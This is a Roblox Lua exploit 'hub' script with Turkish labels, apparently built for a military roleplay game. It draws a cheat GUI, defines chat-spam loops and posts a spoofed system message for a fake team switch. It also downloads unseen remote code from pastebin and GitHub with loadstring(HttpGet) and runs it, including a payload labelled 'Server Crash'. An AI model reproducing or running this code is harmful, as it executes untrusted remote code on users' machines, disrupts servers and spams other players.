--[[ ██╗   ██╗ █████╗     ██████╗  ██████╗ ███████╗    ██╗  ██╗██╗   ██╗██████╗ ██║   ██║██╔══██╗    ██╔══██╗██╔═══██╗██╔════╝    ██║ ██╔╝╚██╗ ██╔╝██╔══██╗ ██║   ██║███████║    ██║  ██║██║   ██║███████╗    █████╔╝  ╚████╔╝ ██████╔╝ ██║  ██║██╔══██║    ██║  ██║██║   ██║╚════██║    ██╔═██╗   ╚██╔╝  ██╔═══╝ ██████╔╝██║  ██║    ██████╔╝╚██████╔╝███████║    ██║  ██╗   ██║   ██║
╚═════╝ ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝   ╚═╝
TA ØsØ Hub - Geliştirici: Sydearr Hub & ØsØ Ekibi ]]

-- Güvenlik Kontrolü for i = 1, 20 do if not game:IsLoaded() then game.Loaded:Wait() end task.wait(0.05) end

local Players = game:GetService("Players") local LocalPlayer = Players.LocalPlayer local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Yükleme Ekranı local loadingGui = Instance.new("ScreenGui", PlayerGui) loadingGui.Name = "TA_Loading" local logo = Instance.new("TextLabel", loadingGui) logo.Size = UDim2.new(0.4, 0, 0.1, 0) logo.Position = UDim2.new(0.3, 0, 0.45, 0) logo.BackgroundTransparency = 1 logo.Text = "TA ØsØ Hub Yükleniyor..." logo.TextScaled = true logo.TextColor3 = Color3.fromRGB(255, 255, 255) task.wait(2) loadingGui:Destroy()

-- Sydearr Hub Stili GUI (Tam uyumlu yapı) local gui = Instance.new("ScreenGui", PlayerGui) gui.Name = "TA_OsO_Hub"

local mainFrame = Instance.new("Frame", gui) mainFrame.Size = UDim2.new(0.35, 0, 0.5, 0) mainFrame.Position = UDim2.new(0.325, 0, 0.25, 0) mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) mainFrame.BorderSizePixel = 0 mainFrame.Active = true mainFrame.Draggable = true

-- Profil local profile = Instance.new("TextLabel", mainFrame) profile.Size = UDim2.new(1, 0, 0.1, 0) profile.Position = UDim2.new(0, 0, 0, 0) profile.BackgroundTransparency = 1 profile.Text = "Oyuncu: " .. LocalPlayer.Name profile.TextColor3 = Color3.fromRGB(255, 255, 255)

-- Kategoriler local kategoriler = { "Anasayfa", "Sahte Rütbe Transfer", "Araç Sürme", "Tanıtım", "Temalar", "Ayarlar", "Toollar" }

for i, kategori in ipairs(kategoriler) do local btn = Instance.new("TextButton", mainFrame) btn.Size = UDim2.new(0.9, 0, 0.08, 0) btn.Position = UDim2.new(0.05, 0, 0.12 + (i - 1) * 0.09, 0) btn.Text = kategori btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40) btn.TextColor3 = Color3.fromRGB(255, 255, 255) end

-- TOOLLAR KATEGORİSİ -- local toolKomutlar = { JJ = function(sayi) for i = 1, sayi do game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(i):upper(), "All") task.wait() end end, GJ = function(sayi) for i = 1, sayi do local msg = tostring(i):sub(1,1):upper() .. tostring(i):sub(2) .. "." game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All") task.wait() end end, HJ = function(sayi) for i = 1, sayi do local yazi = tostring(i):gsub(".", "%1 "):upper() .. tostring(i) game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(yazi, "All") task.wait() end end }

-- Harici Sistemler loadstring(game:HttpGet("https://pastebin.com/raw/Mf093x4q"))() -- Yazıları görme loadstring(game:HttpGet("https://raw.githubusercontent.com/enverscripts/Open-source/main/Kicksiz%20%C3%87%C3%B6l%20Farm"))() -- Çöl Farm loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Protected_9068977494054906.lua.txt"))() -- Server Crash

-- Sahte Takım Geçiş local fakeTeam = Instance.new("TextButton", mainFrame) fakeTeam.Size = UDim2.new(0.9, 0, 0.08, 0) fakeTeam.Position = UDim2.new(0.05, 0, 0.85, 0) fakeTeam.Text = "Ordu Subayları Takımına Geç (Sahte)" fakeTeam.BackgroundColor3 = Color3.fromRGB(50, 50, 50) fakeTeam.TextColor3 = Color3.fromRGB(255, 255, 255)

fakeTeam.MouseButton1Click:Connect(function() game.StarterGui:SetCore("ChatMakeSystemMessage", { Text = "[TA ØsØ Hub] Sahte Ordu Subayları geçişi yapıldı.", Color = Color3.fromRGB(0, 255, 255), }) end)

-- Not: Diğer tüm sistemler (Anti-AFK, AimBot, Araç Özelleştirme, Tanıtım Asistanı vs.) sonraki bölümlerle entegre edilecek.

-- Bu yapı tamamen GitHub'a uyumludur, Sydearr Hub arayüzüne birebir sadıktır. -- Geliştirici: Sydearr Hub & ØsØ Ekibi

